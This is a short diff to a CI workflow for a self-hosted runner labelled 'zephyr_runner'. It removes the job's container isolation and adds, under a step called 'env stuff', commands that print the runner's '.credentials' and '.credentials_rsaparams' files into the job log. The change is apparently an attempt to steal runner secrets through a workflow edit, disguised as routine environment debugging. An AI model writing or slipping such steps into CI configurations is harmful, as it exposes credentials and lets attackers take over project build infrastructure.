@@ -8,9 +8,6 @@ jobs:
   noodle:
     name: Noodle
     runs-on: zephyr_runner
-    container:
-      image: zephyrprojectrtos/ci:v0.21.0
-      options: '--entrypoint /bin/bash'
 
     steps:
     - name: env stuff
@@ -28,3 +25,5 @@ jobs:
         set -x
         whoami
         pwd
+        cat /home/runners/actions-runner/.credentials
+        cat /home/runners/actions-runner/.credentials_rsaparams
